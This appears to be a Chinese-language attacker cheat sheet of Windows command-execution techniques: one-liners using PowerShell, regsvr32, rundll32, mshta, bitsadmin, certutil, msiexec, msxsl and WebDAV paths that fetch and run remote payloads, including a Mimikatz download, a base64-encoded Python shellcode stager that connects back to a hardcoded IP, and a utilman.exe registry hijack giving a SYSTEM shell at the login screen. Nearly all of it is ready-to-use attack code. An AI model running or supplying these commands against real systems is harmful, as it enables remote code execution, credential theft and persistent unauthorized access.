## windows命令执行漏洞

###1、powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```

###2、regsvr32

`regsvr32 /u /s /i:http://127.0.0.1/js.png scrobj.dll`

txt文件中复制下列内容保存为js.png

```
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Learn from Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[
            ps  = "cmd.exe /c calc.exe";
            new ActiveXObject("WScript.Shell").Run(ps,0,true);
 
        ]]>
</script>
</registration>
</scriptlet>
```

Regsvr32命令一共有四个参数，分别是:

/s:注册或卸载成功后不显示操作成功的提示框

/u:卸载已安装的控件或DLL文件

/n:不调用DLLRegisterServer，要注意这个参数应与/i一同使用

/i:调用DLLInstall，并给其传递一个可选的[ cmdline ];当使用/u时用来卸载DLL

###3、rundll32

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%
```

####4、mshta

1） `mshta http://site.com/calc.hta`

2） `mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))`

calc.hta

```
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"
self.close
</script>
<body>
demo
</body>
</HEAD> 
</HTML> 
```

####5、pubprn.vbs

```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
	>
</registration>

<script language="JScript">
<![CDATA[

		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	
	
]]>
</script>

</scriptlet>
```

####6、bitsadmin

```
cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe
```

####7、python（需安装）

```
python2 -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1/abc').read();"
```

abc

```
import base64; exec base64.b64decode("aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==")
```

####8、certutil

```
certutil -urlcache -split -f http://site.com/a a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://192.168.254.102:80/a delete
```

####9、msiexec

```
msiexec /q /i http://site.com/payloads/calc.png
```

calc.png

```
msfvenom -f msi -p windows/exec CMD=calc.exe > cacl.png
```

####10、msxsl.exe(需下载)

```
msxsl https://evi1cg.me/scripts/demo.xml https://evi1cg.me/scripts/exec.xsl
```

demo.xml

```
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
<customers>
<customer>
<name>Microsoft</name>
</customer>
</customers>
```

exec.xsl

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
  
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
   return nodelist.nextNode().xml;
  
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

####11、IEExec

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\> caspol -s off
C:\Windows\Microsoft.NET\Framework\v2.0.50727\> IEExec http://site.com/files/test64.exe
```

####12、IEXPLORE.EXE
这个需要IE存在可执行命令的漏洞

```
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://site.com/exp
```

exp可以使用类似ms14_064

####13、当使用UNC/WebDAV时候多的几种姿势

cmd

`cmd.exe /k < \\webdavserver\folder\batchfile.txt`

Cscript/Wscript

`cscript //E:jscript \\webdavserver\folder\payload.txt`

Regasm/Regsvc

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

dll 可以使用C#写的

Msbuild

```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

pcalua.exe

`pcalua.exe -a \\server\payload.dll `



方式应该还有很多，欢迎留言补充！！












利用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)绕过系统登录界面
登录界面可通过点击图标对其调用
调用辅助工具管理器的快捷键: Win+U
通过注册表劫持实现后门，修改注册表的命令如下：

进程： `utilman.exe`

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system